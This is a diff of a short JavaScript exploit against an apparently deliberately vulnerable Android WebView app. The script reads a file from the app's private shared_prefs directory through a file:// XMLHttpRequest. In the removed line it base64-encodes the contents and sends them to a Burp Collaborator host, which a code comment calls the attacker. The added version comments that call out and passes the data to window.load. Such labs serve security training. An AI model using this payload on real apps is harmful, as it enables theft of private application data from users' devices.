@@ -1,11 +1,12 @@
 <script>
-    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //local file
+    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/FakerActivity.xml'; //local file
     function load(url) {
         var xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
-                fetch('https://8ktm71h4wjnqo72wgqbzvnr7jypodd.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); 
+                // fetch('https://||.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); 
                 //send b64 encoded file to attacker
+                window.load(xhr.responseText)
             }
         }
         xhr.open('GET', url, true);
